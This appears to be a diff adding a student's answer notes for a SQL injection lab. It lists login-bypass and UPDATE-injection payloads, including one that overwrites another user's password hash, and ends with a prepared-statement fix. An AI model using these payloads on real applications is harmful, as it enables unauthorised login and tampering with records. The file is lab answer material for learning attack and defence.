@@ -1,0 +1,27 @@
+Task 2.1:
+admin' OR '1'='1
+Task 2.2:
+curl http://www.seed-server.com/unsafe_home.php?username=admin%27%20OR%20%271%27=%271&Password=
+Task 3.1:
+in 1 of the fields put this: marco',salary='400
+TASK 3.2:
+marco', salary='100' where Name='Boby'#
+TASK 3.3:
+marco', Password='356a192b7913b04c54574d18c28d46e6395428ab' where Name='Boby'#
+TASK 4:
+$input_uname = $_GET['username'];
+$input_pwd = $_GET['Password'];
+$hashed_pwd = sha1($input_pwd);
+
+// create a connection
+$conn = getDB();
+
+// do the query
+$stmt = $conn->prepare("SELECT id, name, eid, salary, ssn
+                        FROM credential
+                        WHERE name= ? and Password= ?");
+$stmt -> bind_param("ss",$input_uname, $hashed_pwd);
+$stmt -> execute();
+$stmt -> bind_result($id,$name,$eid,$salary,$ssn);
+$stmt -> fetch();
+
